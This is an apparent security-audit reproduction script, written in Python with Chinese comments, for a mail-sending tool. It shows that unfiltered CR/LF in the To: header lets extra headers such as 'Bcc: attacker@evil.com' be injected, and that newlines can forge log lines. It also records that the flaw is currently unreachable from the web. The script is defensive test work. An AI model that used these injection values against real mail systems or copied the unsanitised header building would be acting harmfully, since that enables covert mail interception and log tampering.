#!/usr/bin/env python3
# SH-15 等价模型：send-mail.py 的邮件头构造与滥用面
#   (1) `To: ` 头用未过滤的收件人参数拼接 -> 含 CR/LF 时可注入额外头（Bcc/Content-Type…）；
#       实测：Python 的 Header() 会把主题（含纯 ASCII）编码成 encoded-word，主题是安全的；
#   (2) 当前唯一调用方（lib.php:331-333）前有 FILTER_VALIDATE_EMAIL，故今天无法从 Web 触发；
#       但脚本本身是 root/sudo 可执行程序，任何新调用方/运维手敲都会踩到；
#   (3) 收件人/请求者被原样写进 /var/log/send-mail.log -> 换行可伪造日志行；
#   (4) msmtp 用 argv 列表调用（无 shell），信封收件人不会被 shell 注入；
#   (5) SMTP 的 TLS 校验取决于 /etc/msmtprc（未交付）-> 无法核对；
#   (6) 配额计数是“读-改-写”无锁 -> 并发发信会丢计数。
import os
import re
import sys
from email.header import Header

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.normpath(os.path.join(HERE, "..", "..", "..", "src"))
MAIL = os.path.join(SRC, "cloud", "usr", "local", "sbin", "send-mail.py")
LIB = os.path.join(SRC, "cloud", "var", "www", "chat-lib", "lib.php")
API = os.path.join(SRC, "cloud", "var", "www", "chat", "api.php")


def lines(p):
    with open(p, encoding="utf-8") as f:
        return f.read().splitlines()


def build_message(to, subj, text):
    """send-mail.py:107-117 的等价实现。"""
    try:
        subj_enc = Header(subj, "utf-8").encode()
    except Exception:
        subj_enc = subj
    parts = ["From: noreply@lzj2012.top", "To: " + to, "Subject: " + subj_enc,
             "MIME-Version: 1.0", "Content-Type: text/plain; charset=UTF-8",
             "Content-Transfer-Encoding: 8bit", "", text]
    return chr(10).join(parts)


def main():
    m, lib, api = lines(MAIL), lines(LIB), lines(API)
    ok = True
    print("== 0. 源码事实（work/src 行号）==")
    for n in (5, 107, 108, 109, 110, 111, 112, 113, 114, 116, 117, 118, 119, 120, 127, 135, 141, 146, 148):
        print("send-mail.py:%d: %s" % (n, m[n - 1].rstrip()))
    print("--- 当前唯一调用方 ---")
    for n in (331, 332, 333, 336, 338, 354):
        print("lib.php:%d: %s" % (n, lib[n - 1].strip()))
    print()

    print("== 1. To: 头注入（真实复现）+ 主题是否安全 ==")
    to = "victim@example.com\r\nBcc: attacker@evil.com\r\nX-Injected: 1"
    msg = build_message(to, "Hi\r\nBcc: a@b", "body")
    print("   构造出的邮件（repr，\\r\\n 已可见）:")
    print("     %r" % msg.split("\n\n")[0][:260])
    injected = ("Bcc: attacker@evil.com" in msg.split("\n\n")[0]
                and "X-Injected: 1" in msg.split("\n\n")[0])
    print("   是否成功注入额外头: %s" % ("是" if injected else "否"))
    ok = ok and injected
    subj_safe = "Bcc: a@b" not in msg and "=?" in msg
    print("   主题（Header().encode()）是否已编码、不构成注入: %s" % ("是" if subj_safe else "否"))
    ok = ok and subj_safe
    print()
    print("   注意：换行是 \\n（脚本用 NL=chr(10) 拼接），但 to 里的 \\r\\n 会原样进入头；")
    print("   msmtp 读的是 stdin 消息体，头注入与信封地址是否被 msmtp 拒绝是两件事。")
    print()

    print("== 2. 脚本自身没有任何 CR/LF/格式校验（静态核对）==")
    mtxt = "\n".join(m)
    checks = [
        ("send-mail.py 中无 \\r/\\n 过滤", not re.search(r"\\r|\\n|strip\(.*to|replace\('\\n'", mtxt)),
        ("send-mail.py 中无邮箱格式校验", "re.match" not in mtxt and "email.utils" not in mtxt),
        ("msmtp 用 argv 列表（无 shell）", "subprocess.run(['msmtp'" in mtxt or 'subprocess.run(["msmtp"' in mtxt),
        ("日志里拼接 to/who 未净化", "'｜收件人 ' + to" in mtxt and "'｜请求者 ' + who" in mtxt),
        ("配额读改写无锁", "qload()" in mtxt and "flock" not in mtxt),
        ("脚本内无 TLS 配置（依赖 msmtprc）", "tls" not in mtxt.lower()),
    ]
    for name, cond in checks:
        print("   %-34s %s" % (name, "成立" if cond else "不成立"))
    ok = ok and all(c for _, c in checks)
    print()

    print("== 3. 当前 Web 可达性（为什么今天只是加固项）==")
    guarded = []
    for i, ln in enumerate(api, 1):
        if "FILTER_VALIDATE_EMAIL" in ln:
            guarded.append("api.php:%d" % i)
    print("   邮箱格式校验位置: %s" % ", ".join(guarded))
    print("   唯一调用点 lib.php:354 的收件人 $email 来自上述校验过的入口；")
    print("   主题是常量 '【聊天室】邮箱验证码'，正文由服务端生成 -> 当前 Web 用户无法控制头字段。")
    print("   => 现状：不可从 Web 触发（待验证：sudoers 未交付，若允许任意参数则风险上升）。")
    print()

    print("== 4. 日志注入 ==")
    for who in ("正常", "x\r\n2026-11-08T00:00:00Z 成功｜通道 主通道(Resend)｜请求者 伪造"):
        log_line = "成功｜通道 主通道(Resend)｜请求者 " + who + "｜收件人 " + "a@b.c" + "｜resend HTTP 200"
        print("   who=%r -> 日志行数=%d" % (who, log_line.count(chr(10)) + 1))
    print("   => 伪造的日志行会误导排查（面板 mailpanel 直接展示）")
    print()
    print("VERDICT: %s" % ("REPRODUCED" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
